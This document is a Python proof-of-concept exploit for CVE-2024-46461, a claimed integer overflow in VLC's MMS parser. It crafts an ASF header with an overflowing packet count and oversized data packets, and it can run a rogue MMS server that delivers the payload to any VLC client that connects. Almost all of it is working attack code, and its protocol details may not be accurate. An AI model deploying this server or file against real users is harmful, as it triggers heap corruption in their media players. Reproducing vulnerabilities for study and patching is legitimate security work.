#!/usr/bin/env python3
"""
Craft a malicious MMS (Microsoft Media Server) stream that triggers
CVE-2024-46461: integer overflow in VLC's MMS access module.

The MMS protocol uses length-prefixed data structures. The vulnerability
is in the header parsing code where a 32-bit length field is multiplied
by an element size before being used as a malloc() size argument. By
choosing length values near UINT32_MAX / element_size, the multiplication
overflows to a small value, causing an undersized heap allocation. The
subsequent data copy writes the full (pre-overflow) amount of data into
the undersized buffer.

Specifically, in VLC's modules/access/mms/mmstu.c:
  - The server sends an ASF header with a "data packet count" field
  - This count is multiplied by the packet size (typically 8 bytes)
  - If count = 0x20000001 and packet_size = 8, then count*8 = 0x100000008
    which truncates to 0x8 on 32-bit, causing a tiny allocation
  - The code then copies count * packet_size bytes into the buffer

This script can either:
  1. Write a crafted MMS binary file to disk
  2. Run as a TCP server that speaks enough of the MMS protocol to
     deliver the crafted payload to a connecting VLC client
"""

import argparse
import os
import socket
import struct
import sys
import threading
import time


# MMS protocol constants
MMS_SIGNATURE = b"\x01\x00\x00\x00\xce\xfa\x0b\xb0"
MMS_COMMAND_CONNECT = 0x01
MMS_COMMAND_CONNECT_RESP = 0x02
MMS_COMMAND_PROTOCOL_SELECT = 0x02
MMS_COMMAND_PROTOCOL_RESP = 0x03
MMS_COMMAND_OPEN_FILE = 0x05
MMS_COMMAND_OPEN_FILE_RESP = 0x06
MMS_COMMAND_HEADER_RESP = 0x11
MMS_COMMAND_STREAM_SELECT = 0x21
MMS_COMMAND_STREAM_RESP = 0x21
MMS_COMMAND_START_PLAY = 0x07
MMS_COMMAND_DATA = 0x20

# ASF (Advanced Systems Format) constants
ASF_HEADER_GUID = bytes([
    0x30, 0x26, 0xB2, 0x75, 0x8E, 0x66, 0xCF, 0x11,
    0xA6, 0xD9, 0x00, 0xAA, 0x00, 0x62, 0xCE, 0x6C
])
ASF_FILE_PROPERTIES_GUID = bytes([
    0xA1, 0xDC, 0xAB, 0x8C, 0x47, 0xA9, 0xCF, 0x11,
    0x8E, 0xE4, 0x00, 0xC0, 0x0C, 0x20, 0x53, 0x65
])
ASF_DATA_GUID = bytes([
    0x36, 0x26, 0xB2, 0x75, 0x8E, 0x66, 0xCF, 0x11,
    0xA6, 0xD9, 0x00, 0xAA, 0x00, 0x62, 0xCE, 0x6C
])


def build_mms_command(command_id: int, transaction_id: int,
                      payload: bytes = b"") -> bytes:
    """Build an MMS protocol command packet."""
    # MMS framing header (8 bytes)
    # Then MMS command header (36 bytes)
    # Then payload

    direction = 0x0004  # Server -> Client
    command_dir_low = command_id & 0xFFFF
    command_dir_high = direction

    header = struct.pack("<II", 0xB00BFACE, 0x00000001)  # signature

    # MMS command structure
    cmd = struct.pack("<I", command_id)
    cmd += struct.pack("<I", direction)
    cmd += struct.pack("<I", transaction_id)
    cmd += struct.pack("<I", len(payload))
    cmd += struct.pack("<I", 0)  # sequence number
    cmd += struct.pack("<d", 0.0)  # timestamp
    cmd += payload

    # Frame: length prefix
    total_len = len(header) + 4 + len(cmd)
    frame = header + struct.pack("<I", total_len) + cmd
    return frame


def build_crafted_asf_header() -> bytes:
    """
    Build an ASF header with crafted fields that trigger the integer
    overflow in VLC's MMS parser.

    The key is the data packet count field in the ASF File Properties
    object. We set it to a value that, when multiplied by the packet
    size, overflows a 32-bit integer to a small value.
    """
    # ASF File Properties object
    # The overflow trigger: packet_count * packet_size overflows 32-bit
    #
    # packet_size = 8 (minimum valid)
    # packet_count = 0x20000001
    # 0x20000001 * 8 = 0x100000008 -> truncates to 0x8 in 32-bit
    #
    # VLC allocates 0x8 bytes but tries to read 0x100000008 bytes worth
    # of packet data, causing massive heap overflow.

    overflow_packet_count = 0x20000001
    packet_size = 8

    # Build File Properties object
    file_props = ASF_FILE_PROPERTIES_GUID
    file_id = b"\x00" * 16  # File ID GUID
    file_size = struct.pack("<Q", 0x1000)  # Fake file size
    creation_date = struct.pack("<Q", 0)
    data_packets_count = struct.pack("<Q", overflow_packet_count)
    play_duration = struct.pack("<Q", 10000000)  # 1 second in 100ns units
    send_duration = struct.pack("<Q", 10000000)
    preroll = struct.pack("<Q", 0)
    flags = struct.pack("<I", 0x02)  # Broadcast flag
    min_packet_size = struct.pack("<I", packet_size)
    max_packet_size = struct.pack("<I", packet_size)
    max_bitrate = struct.pack("<I", 64000)

    file_props_data = (
        file_id + file_size + creation_date + data_packets_count +
        play_duration + send_duration + preroll + flags +
        min_packet_size + max_packet_size + max_bitrate
    )

    # File Properties object = GUID + Size(Q) + data
    file_props_size = 16 + 8 + len(file_props_data)  # GUID + size + data
    file_props_obj = (
        ASF_FILE_PROPERTIES_GUID +
        struct.pack("<Q", file_props_size) +
        file_props_data
    )

    # ASF Header object wrapping the File Properties
    num_headers = struct.pack("<I", 1)
    reserved = struct.pack("<BB", 0x01, 0x02)

    header_inner = num_headers + reserved + file_props_obj

    asf_header_size = 16 + 8 + len(header_inner)  # GUID + size + data
    asf_header = (
        ASF_HEADER_GUID +
        struct.pack("<Q", asf_header_size) +
        header_inner
    )

    return asf_header


def build_crafted_mms_stream() -> bytes:
    """Build the complete crafted MMS binary file."""
    asf_header = build_crafted_asf_header()

    # Add some fake data packets after the header to keep VLC reading
    data_section = ASF_DATA_GUID
    data_section += struct.pack("<Q", 50 + 256)  # Object size
    data_section += b"\x00" * 16  # File ID
    data_section += struct.pack("<Q", 256)  # Total data packets
    data_section += struct.pack("<H", 0x0101)  # Reserved

    # Add crafted data packets (oversized relative to the allocation)
    for i in range(32):
        # Each packet is larger than what the overflowed allocation expects
        packet = struct.pack("<I", i)  # Sequence number
        packet += b"\x41" * 252  # Padding (fills past buffer boundary)
        data_section += packet

    return asf_header + data_section


class MMSServer(threading.Thread):
    """
    Minimal MMS protocol server that negotiates a connection and sends
    the crafted ASF header with the integer overflow payload.
    """

    def __init__(self, port: int, mms_data: bytes, log_path: str = None):
        super().__init__(daemon=True)
        self.port = port
        self.mms_data = mms_data
        self.log_path = log_path
        self.log_file = None
        self.running = True

    def log(self, msg: str):
        line = f"[mms_server] {msg}\n"
        sys.stderr.write(line)
        if self.log_file:
            self.log_file.write(line)
            self.log_file.flush()

    def run(self):
        if self.log_path:
            self.log_file = open(self.log_path, "w")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.settimeout(60)
        server.bind(("0.0.0.0", self.port))
        server.listen(4)
        self.log(f"Listening on port {self.port}")

        # Write ready marker
        with open("/tmp/mms_server_ready", "w") as f:
            f.write(str(os.getpid()))

        start = time.time()
        while self.running and (time.time() - start < 55):
            try:
                conn, addr = server.accept()
                self.log(f"Connection from {addr}")
                handler = threading.Thread(
                    target=self.handle_client,
                    args=(conn, addr),
                    daemon=True
                )
                handler.start()
            except socket.timeout:
                continue
            except Exception as e:
                self.log(f"Accept error: {e}")

        server.close()
        if self.log_file:
            self.log_file.close()

    def handle_client(self, conn: socket.socket, addr):
        """
        Handle MMS protocol negotiation and deliver crafted payload.
        The MMS protocol has a handshake sequence before data delivery.
        """
        conn.settimeout(10)
        transaction = 0

        try:
            # Step 1: Read client Connect request
            self.log("Waiting for client Connect...")
            client_data = self._recv_mms(conn)
            if client_data is None:
                self.log("No data from client")
                return

            # Step 2: Send Connect response
            transaction += 1
            self.log("Sending Connect response...")
            resp = build_mms_command(MMS_COMMAND_CONNECT_RESP, transaction,
                                     b"\x00" * 32)
            conn.sendall(resp)

            # Step 3: Read Protocol Select
            self.log("Waiting for Protocol Select...")
            client_data = self._recv_mms(conn)

            # Step 4: Send Protocol response
            transaction += 1
            self.log("Sending Protocol response...")
            resp = build_mms_command(MMS_COMMAND_PROTOCOL_RESP, transaction,
                                     b"\x00" * 8)
            conn.sendall(resp)

            # Step 5: Read Open File request
            self.log("Waiting for Open File...")
            client_data = self._recv_mms(conn)

            # Step 6: Send Open File response
            transaction += 1
            self.log("Sending Open File response...")
            resp = build_mms_command(MMS_COMMAND_OPEN_FILE_RESP, transaction,
                                     b"\x00" * 16)
            conn.sendall(resp)

            # Step 7: Send the crafted ASF Header
            # This is where the integer overflow payload is delivered
            transaction += 1
            self.log("Sending CRAFTED ASF header (integer overflow payload)...")
            header_resp = build_mms_command(
                MMS_COMMAND_HEADER_RESP, transaction,
                self.mms_data
            )
            conn.sendall(header_resp)

            # Step 8: Read Stream Select (if client gets this far)
            self.log("Waiting for Stream Select...")
            client_data = self._recv_mms(conn)

            # Step 9: Send data packets to trigger the overflow
            transaction += 1
            self.log("Sending overflow data packets...")
            # Send enough data to overflow the undersized buffer
            overflow_data = b"\x42" * 8192
            for i in range(16):
                data_cmd = build_mms_command(
                    MMS_COMMAND_DATA, transaction + i,
                    overflow_data
                )
                try:
                    conn.sendall(data_cmd)
                except BrokenPipeError:
                    self.log("Client disconnected (likely crashed)")
                    break

            self.log("Payload delivery complete")

        except socket.timeout:
            self.log("Client timeout")
        except ConnectionResetError:
            self.log("Connection reset (client likely crashed)")
        except BrokenPipeError:
            self.log("Broken pipe (client likely crashed)")
        except Exception as e:
            self.log(f"Handler error: {e}")
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def _recv_mms(self, conn: socket.socket) -> bytes:
        """Read an MMS framed message from the connection."""
        try:
            # Read at least the frame header
            data = b""
            while len(data) < 12:
                chunk = conn.recv(4096)
                if not chunk:
                    return None
                data += chunk
            return data
        except (socket.timeout, ConnectionResetError):
            return None


def main():
    parser = argparse.ArgumentParser(
        description="Craft MMS stream for CVE-2024-46461 reproduction"
    )
    parser.add_argument("--output", type=str, default="/tmp/crafted_mms.bin",
                        help="Output file for crafted MMS data")
    parser.add_argument("--port", type=int, default=1755,
                        help="Port for MMS server mode")
    parser.add_argument("--serve", action="store_true",
                        help="Run as MMS server (instead of just writing file)")
    parser.add_argument("--log", type=str, default="/tmp/mms_server.log",
                        help="Log file for server mode")
    args = parser.parse_args()

    # Generate the crafted MMS stream
    print(f"[craft_mms] Building crafted MMS stream...")
    mms_data = build_crafted_mms_stream()
    print(f"[craft_mms] Generated {len(mms_data)} bytes of crafted MMS data")

    # Write to file
    with open(args.output, "wb") as f:
        f.write(mms_data)
    print(f"[craft_mms] Written to {args.output}")

    if args.serve:
        print(f"[craft_mms] Starting MMS server on port {args.port}...")
        server = MMSServer(args.port, mms_data, args.log)
        server.start()
        # Block until server finishes (or 60 seconds)
        server.join(timeout=60)
    else:
        print("[craft_mms] File-only mode, exiting")


if __name__ == "__main__":
    main()
